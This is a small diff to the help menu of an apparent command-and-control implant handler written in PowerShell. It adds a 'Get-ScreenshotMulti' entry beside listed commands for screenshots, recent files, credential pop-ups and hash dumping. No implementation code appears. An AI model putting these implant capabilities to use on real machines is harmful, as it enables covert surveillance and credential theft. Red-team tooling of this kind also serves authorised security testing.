@@ -228,6 +228,7 @@ function Implant-Handler
         write-host "====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
         write-host " Get-Screenshot" -ForegroundColor Green 
+        write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green 
         write-host " Get-RecentFiles" -ForegroundColor Green
         write-host " Cred-Popper" -ForegroundColor Green 
         write-host " Hashdump" -ForegroundColor Green 
